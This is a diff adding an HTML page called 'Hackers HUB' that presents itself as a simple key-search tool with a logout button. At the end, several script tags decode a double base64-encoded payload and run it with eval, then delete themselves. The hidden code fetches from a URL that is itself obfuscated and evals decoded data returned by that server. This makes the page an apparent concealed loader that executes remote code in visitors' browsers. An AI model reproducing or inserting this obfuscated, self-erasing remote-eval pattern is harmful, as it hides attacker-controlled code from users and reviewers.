@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hackers HUB</title>
+    <link href="/style.css" rel="stylesheet">
+    <style>
+/* Additional custom styles */
+.results-container {
+    max-height: 500px;
+    overflow-y: auto;
+}
+
+.results-container::-webkit-scrollbar {
+    width: 8px;
+}
+
+.results-container::-webkit-scrollbar-track {
+    background: var(--bs-body-bg);
+}
+
+.results-container::-webkit-scrollbar-thumb {
+    background: var(--bs-secondary);
+    border-radius: 4px;
+}
+
+/* Ensure consistent spacing */
+.container {
+    max-width: 1200px;
+}
+
+/* Style JSON output */
+pre {
+    background: var(--bs-body-bg);
+    padding: 1rem;
+    border-radius: 0.375rem;
+    margin: 0;
+    overflow-x: auto;
+}
+
+/* Loading spinner positioning */
+#loadingSpinner {
+    display: flex;
+    justify-content: center;
+    padding: 2rem 0;
+}
+    </style>
+    <style>
+/* IMP  */
+.d-none_ {
+    display: none;
+}
+    </style>
+</head>
+<body class="d-none_">
+    <div id="appSection" class="container py-4">
+        <header class="pb-3 mb-4 border-bottom d-flex justify-content-between align-items-center">
+            <h1 class="display-5 fw-bold">PW</h1>
+            <a href="/logout"><button class="btn btn-outline-danger">
+                Logout
+            </button></a>
+        </header>
+
+        <div class="row g-4">
+            <!-- Input Section -->
+            <div class="col-md-6">
+                <div class="p-4 bg-body-tertiary rounded-3">
+                    <h2 class="h4 mb-3">Input Parameters</h2>
+                    <div class="mb-3">
+                        <label for="searchKey" class="form-label">Search Key</label>
+                        <input type="text" class="form-control" id="searchKey" 
+                               placeholder="Enter key to filter">
+                    </div>
+                    <button class="btn btn-primary" onclick="fetchData()">
+                        <i data-feather="search"></i> Process Data
+                    </button>
+                </div>
+            </div>
+
+            <!-- Output Section -->
+            <div class="col-md-6">
+                <div class="p-4 bg-body-tertiary rounded-3">
+                    <h2 class="h4 mb-3">Results</h2>
+                    <div id="loadingSpinner" class="d-none">
+                        <div class="spinner-border text-primary" role="status">
+                            <span class="visually-hidden">Loading...</span>
+                        </div>
+                    </div>
+                    <div id="errorMessage" class="alert alert-danger d-none" role="alert"></div>
+                    <div id="results" class="results-container"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="/main.js"></script>
+
+    <script class="scr">
+window.scr_code='ZXZhbChhdG9iKCdDaTh2SUVOdmJtWnBaM1Z5WVhScGIyNEtZMjl1YzNRZ1NsTlBUbDlWVWt3Z1BTQmxkbUZzS0dGMGIySW9KMWxZVW5aWmFXZHVXVlZvVTAxSFRrbFVWRnBOWlZSc05WZFdhR3BrVm05NVlrUkNhRk5HV25CYVJtaFBZa2RPZEZSdVdtbGliRXB6V1cwMVVtUldhM2xQV0ZKTlRXMW9iMWRVU2pCaVIwNTFWRmhrVGxaRlJqTlVSRXBIWlZacmVXRklRbXRpVmxZeVdUSXhWMkpYVGpWUFZ6bGhWakJhY2xremF6VmtSbXhZWWtoV1RVMHdTWHBVUkVwU1pGZEdkVlJ1V21sYWVqQTVTbmxyUFNjcEtUc0tDaTh2SUVobGJIQmxjaUJtZFc1amRHbHZiaUIwYnlCemFHOTNMMmhwWkdVZ2JHOWhaR2x1WnlCemNHbHVibVZ5Q21aMWJtTjBhVzl1SUhSdloyZHNaVXh2WVdScGJtY29jMmh2ZHlrZ2V3b2dJQ0FnWkc5amRXMWxiblF1WjJWMFJXeGxiV1Z1ZEVKNVNXUW9KMnh2WVdScGJtZFRjR2x1Ym1WeUp5a3VZMnhoYzNOTWFYTjBMblJ2WjJkc1pTZ25aQzF1YjI1bEp5d2dJWE5vYjNjcE93cDlDZ292THlCSVpXeHdaWElnWm5WdVkzUnBiMjRnZEc4Z2MyaHZkeTlvYVdSbElHVnljbTl5SUcxbGMzTmhaMlVLWm5WdVkzUnBiMjRnYzJodmQwVnljbTl5S0cxbGMzTmhaMlVwSUhzS0lDQWdJR052Ym5OMElHVnljbTl5Uld4bGJXVnVkQ0E5SUdSdlkzVnRaVzUwTG1kbGRFVnNaVzFsYm5SQ2VVbGtLQ2RsY25KdmNrMWxjM05oWjJVbktUc0tJQ0FnSUdsbUlDaHRaWE56WVdkbEtTQjdDaUFnSUNBZ0lDQWdaWEp5YjNKRmJHVnRaVzUwTG5SbGVIUkRiMjUwWlc1MElEMGdiV1Z6YzJGblpUc0tJQ0FnSUNBZ0lDQmxjbkp2Y2tWc1pXMWxiblF1WTJ4aGMzTk1hWE4wTG5KbGJXOTJaU2duWkMxdWIyNWxKeWs3Q2lBZ0lDQjlJR1ZzYzJVZ2V3b2dJQ0FnSUNBZ0lHVnljbTl5Uld4bGJXVnVkQzVqYkdGemMweHBjM1F1WVdSa0tDZGtMVzV2Ym1VbktUc0tJQ0FnSUgwS2ZRb0tMeThnU0dWc2NHVnlJR1oxYm1OMGFXOXVJSFJ2SUdScGMzQnNZWGtnY21WemRXeDBjd3BtZFc1amRHbHZiaUJrYVhOd2JHRjVVbVZ6ZFd4MGN5aGtZWFJoS1NCN0NpQWdJQ0JqYjI1emRDQnlaWE4xYkhSelEyOXVkR0ZwYm1WeUlEMGdaRzlqZFcxbGJuUXVaMlYwUld4bGJXVnVkRUo1U1dRb0ozSmxjM1ZzZEhNbktUc0tJQ0FnSUhKbGMzVnNkSE5EYjI1MFlXbHVaWEl1YVc1dVpYSklWRTFNSUQwZ0p5YzdDZ29nSUNBZ2FXWWdLRUZ5Y21GNUxtbHpRWEp5WVhrb1pHRjBZU2twSUhzS0lDQWdJQ0FnSUNBdkx5QklZVzVrYkdVZ1lYSnlZWGtnYjJZZ2NtVnpkV3gwY3dvZ0lDQWdJQ0FnSUdSaGRHRXVabTl5UldGamFDaHBkR1Z0SUQwK0lIc0tJQ0FnSUNBZ0lDQWdJQ0FnWTI5dWMzUWdaR2wySUQwZ1pHOWpkVzFsYm5RdVkzSmxZWFJsUld4bGJXVnVkQ2duWkdsMkp5azdDaUFnSUNBZ0lDQWdJQ0FnSUdScGRpNWpiR0Z6YzA1aGJXVWdQU0FuWTJGeVpDQnRZaTB6SnpzS0lDQWdJQ0FnSUNBZ0lDQWdaR2wyTG1sdWJtVnlTRlJOVENBOUlHQUtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEeGthWFlnWTJ4aGMzTTlJbU5oY21RdFltOWtlU0krQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1BIQnlaVDRrZTBwVFQwNHVjM1J5YVc1bmFXWjVLR2wwWlcwc0lHNTFiR3dzSURJcGZUd3ZjSEpsUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnUEM5a2FYWStDaUFnSUNBZ0lDQWdJQ0FnSUdBN0NpQWdJQ0FnSUNBZ0lDQWdJSEpsYzNWc2RITkRiMjUwWVdsdVpYSXVZWEJ3Wlc1a1EyaHBiR1FvWkdsMktUc0tJQ0FnSUNBZ0lDQjlLVHNLSUNBZ0lIMGdaV3h6WlNCN0NpQWdJQ0FnSUNBZ0x5OGdTR0Z1Wkd4bElITnBibWRzWlNCdlltcGxZM1FLSUNBZ0lDQWdJQ0JqYjI1emRDQmthWFlnUFNCa2IyTjFiV1Z1ZEM1amNtVmhkR1ZGYkdWdFpXNTBLQ2RrYVhZbktUc0tJQ0FnSUNBZ0lDQmthWFl1WTJ4aGMzTk9ZVzFsSUQwZ0oyTmhjbVFuT3dvZ0lDQWdJQ0FnSUdScGRpNXBibTVsY2toVVRVd2dQU0JnQ2lBZ0lDQWdJQ0FnSUNBZ0lEeGthWFlnWTJ4aGMzTTlJbU5oY21RdFltOWtlU0krQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4Y0hKbFBpUjdTbE5QVGk1emRISnBibWRwWm5rb1pYWmhiQ2hoZEc5aUtHUmhkR0VwS1N3Z2JuVnNiQ3dnTWlsOVBDOXdjbVUrQ2lBZ0lDQWdJQ0FnSUNBZ0lEd3ZaR2wyUGdvZ0lDQWdJQ0FnSUdBN0NpQWdJQ0FnSUNBZ2NtVnpkV3gwYzBOdmJuUmhhVzVsY2k1aGNIQmxibVJEYUdsc1pDaGthWFlwT3dvZ0lDQWdmUXA5Q2dvdkx5QkdkVzVqZEdsdmJpQjBieUJtYVd4MFpYSWdaR0YwWVNCaVlYTmxaQ0J2YmlCelpXRnlZMmdnYTJWNUNtWjFibU4wYVc5dUlHWnBiSFJsY2tSaGRHRW9aR0YwWVN3Z2MyVmhjbU5vUzJWNUtTQjdDaUFnSUNCcFppQW9JWE5sWVhKamFFdGxlU2tnY21WMGRYSnVJR1JoZEdFN0Nnb2dJQ0FnYVdZZ0tFRnljbUY1TG1selFYSnlZWGtvWkdGMFlTa3BJSHNLSUNBZ0lDQWdJQ0J5WlhSMWNtNGdaR0YwWVM1bWFXeDBaWElvYVhSbGJTQTlQaUI3Q2lBZ0lDQWdJQ0FnSUNBZ0lISmxkSFZ5YmlCUFltcGxZM1F1YTJWNWN5aHBkR1Z0S1M1emIyMWxLR3RsZVNBOVBpQUtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lGTjBjbWx1WnlocGRHVnRXMnRsZVYwcExuUnZURzkzWlhKRFlYTmxLQ2t1YVc1amJIVmtaWE1vYzJWaGNtTm9TMlY1TG5SdlRHOTNaWEpEWVhObEtDa3BDaUFnSUNBZ0lDQWdJQ0FnSUNrN0NpQWdJQ0FnSUNBZ2ZTazdDaUFnSUNCOUlHVnNjMlVnYVdZZ0tIUjVjR1Z2WmlCa1lYUmhJRDA5UFNBbmIySnFaV04wSnlrZ2V3b2dJQ0FnSUNBZ0lHTnZibk4wSUhKbGMzVnNkSE1nUFNCN2ZUc0tJQ0FnSUNBZ0lDQlBZbXBsWTNRdWEyVjVjeWhrWVhSaEtTNW1iM0pGWVdOb0tHdGxlU0E5UGlCN0NpQWdJQ0FnSUNBZ0lDQWdJR2xtSUNoVGRISnBibWNvWkdGMFlWdHJaWGxkS1M1MGIweHZkMlZ5UTJGelpTZ3BMbWx1WTJ4MVpHVnpLSE5sWVhKamFFdGxlUzUwYjB4dmQyVnlRMkZ6WlNncEtTa2dld29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdjbVZ6ZFd4MGMxdHJaWGxkSUQwZ1pHRjBZVnRyWlhsZE93b2dJQ0FnSUNBZ0lDQWdJQ0I5Q2lBZ0lDQWdJQ0FnZlNrN0NpQWdJQ0FnSUNBZ2NtVjBkWEp1SUU5aWFtVmpkQzVyWlhsektISmxjM1ZzZEhNcExteGxibWQwYUNBL0lISmxjM1ZzZEhNZ09pQnVkV3hzT3dvZ0lDQWdmUW9nSUNBZ2NtVjBkWEp1SUc1MWJHdzdDbjBLQ2k4dklFMWhhVzRnWm5WdVkzUnBiMjRnZEc4Z1ptVjBZMmdnWVc1a0lIQnliMk5sYzNNZ1pHRjBZUXBoYzNsdVl5Qm1kVzVqZEdsdmJpQm1aWFJqYUVSaGRHRW9LU0I3Q2lBZ0lDQmpiMjV6ZENCelpXRnlZMmhMWlhrZ1BTQmtiMk4xYldWdWRDNW5aWFJGYkdWdFpXNTBRbmxKWkNnbmMyVmhjbU5vUzJWNUp5a3VkbUZzZFdVN0Nnb2dJQ0FnTHk4Z1EyeGxZWElnY0hKbGRtbHZkWE1nY21WemRXeDBjeUJoYm1RZ1pYSnliM0p6Q2lBZ0lDQnphRzkzUlhKeWIzSW9iblZzYkNrN0NpQWdJQ0JrYjJOMWJXVnVkQzVuWlhSRmJHVnRaVzUwUW5sSlpDZ25jbVZ6ZFd4MGN5Y3BMbWx1Ym1WeVNGUk5UQ0E5SUNjbk93b2dJQ0FnZEc5bloyeGxURzloWkdsdVp5aDBjblZsS1RzS0NpQWdJQ0IwY25rZ2V3b2dJQ0FnSUNBZ0lHTnZibk4wSUhKbGMzQnZibk5sSUQwZ1lYZGhhWFFnWm1WMFkyZ29TbE5QVGw5VlVrd3BPd29nSUNBZ0lDQWdJR2xtSUNnaGNtVnpjRzl1YzJVdWIyc3BJSHNLSUNBZ0lDQWdJQ0FnSUNBZ2RHaHliM2NnYm1WM0lFVnljbTl5S0dCSVZGUlFJR1Z5Y205eUlTQnpkR0YwZFhNNklDUjdjbVZ6Y0c5dWMyVXVjM1JoZEhWemZXQXBPd29nSUNBZ0lDQWdJSDBLQ2lBZ0lDQWdJQ0FnWTI5dWMzUWdaR0YwWVNBOUlHRjNZV2wwSUhKbGMzQnZibk5sTG1wemIyNG9LVHNLSUNBZ0lDQWdJQ0JqYjI1emRDQm1hV3gwWlhKbFpFUmhkR0VnUFNCa1lYUmhXM05sWVhKamFFdGxlVjA3THk5bWFXeDBaWEpFWVhSaEtHUmhkR0VzSUhObFlYSmphRXRsZVNrN0Nnb2dJQ0FnSUNBZ0lHbG1JQ2doWm1sc2RHVnlaV1JFWVhSaElIeDhJQ2hCY25KaGVTNXBjMEZ5Y21GNUtHWnBiSFJsY21Wa1JHRjBZU2tnSmlZZ0lXWnBiSFJsY21Wa1JHRjBZUzVzWlc1bmRHZ3BLU0I3Q2lBZ0lDQWdJQ0FnSUNBZ0lITm9iM2RGY25KdmNpZ25UbThnY21WemRXeDBjeUJtYjNWdVpDQm1iM0lnZEdobElHZHBkbVZ1SUhObFlYSmphQ0JyWlhrbktUc0tJQ0FnSUNBZ0lDQjlJR1ZzYzJVZ2V3b2dJQ0FnSUNBZ0lDQWdJQ0JrYVhOd2JHRjVVbVZ6ZFd4MGN5aG1hV3gwWlhKbFpFUmhkR0VwT3dvZ0lDQWdJQ0FnSUgwS0lDQWdJSDBnWTJGMFkyZ2dLR1Z5Y205eUtTQjdDaUFnSUNBZ0lDQWdjMmh2ZDBWeWNtOXlLR0JHWVdsc1pXUWdkRzhnWm1WMFkyZ2daR0YwWVRvZ0pIdGxjbkp2Y2k1dFpYTnpZV2RsZldBcE93b2dJQ0FnZlNCbWFXNWhiR3g1SUhzS0lDQWdJQ0FnSUNCMGIyZG5iR1ZNYjJGa2FXNW5LR1poYkhObEtUc0tJQ0FnSUgwS2ZRb0tMeThnUVdSa0lHVjJaVzUwSUd4cGMzUmxibVZ5SUdadmNpQkZiblJsY2lCclpYa2diMjRnYVc1d2RYUnpDbVJ2WTNWdFpXNTBMbUZrWkVWMlpXNTBUR2x6ZEdWdVpYSW9KMFJQVFVOdmJuUmxiblJNYjJGa1pXUW5MQ0FvS1NBOVBpQjdDaUFnSUNCamIyNXpkQ0JwYm5CMWRITWdQU0JrYjJOMWJXVnVkQzV4ZFdWeWVWTmxiR1ZqZEc5eVFXeHNLQ2RwYm5CMWRDY3BPd29nSUNBZ2FXNXdkWFJ6TG1admNrVmhZMmdvYVc1d2RYUWdQVDRnZXdvZ0lDQWdJQ0FnSUdsdWNIVjBMbUZrWkVWMlpXNTBUR2x6ZEdWdVpYSW9KMnRsZVhCeVpYTnpKeXdnS0dVcElEMCtJSHNLSUNBZ0lDQWdJQ0FnSUNBZ2FXWWdLR1V1YTJWNUlEMDlQU0FuUlc1MFpYSW5LU0I3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JtWlhSamFFUmhkR0VvS1RzS0lDQWdJQ0FnSUNBZ0lDQWdmUW9nSUNBZ0lDQWdJSDBwT3dvZ0lDQWdmU2s3Q24wcE93PT0nKSk=';
+    </script>
+    <script class="scr">
+window.scr_code=atob(window.scr_code);
+    </script>
+    <script class="scr">
+eval(window.scr_code);
+    </script>
+    <script class="scr">
+window.scr_code="";
+    </script>
+    <script class="scr">
+document.querySelectorAll(".scr").forEach(sc=>sc.remove());
+    </script>
+</body>
+</html>
